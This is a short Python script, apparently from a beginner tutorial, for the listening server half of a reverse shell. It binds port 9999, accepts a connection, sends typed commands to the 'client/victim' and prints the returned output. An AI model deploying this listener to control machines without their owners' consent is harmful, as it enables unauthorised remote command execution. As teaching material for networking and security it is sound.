# Server

import socket  # for socket
import sys  # implement command lines



# Create a Socket ( connect to computers )
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding Port " + str(port))

        s.bind((host,port))
        s.listen(5)  # continously listen for connection. list for 5 connections

    except socket.error as msg:
        print("Socket binding error " + str(msg) + "\n" + "Retrying...")
        bind_socket()  # recall function to retry binding port and host with socket


# Eastablish connection with a client (socket must be listening)
def socket_accept():
    conn, address = s.accept()  # accept the connection
    # connection stored in conn
    # ip address stored in address
    print("Connection has been established " + " IP " + address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close()


# Send commands to client/victim or a friend
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:  # user HAS typed something in
            conn.send(str.encode(cmd))  # sends data to client pc 

            # store output in variable. buffer sends 1024 bits in chunks back.
            client_response = str(conn.recv(1024),"utf-8")  # 1024 buffer
            print(client_response, end="") # end="" returns cursor to next line


# Calls above function
def main():
    create_socket()
    bind_socket()
    socket_accept()




main()

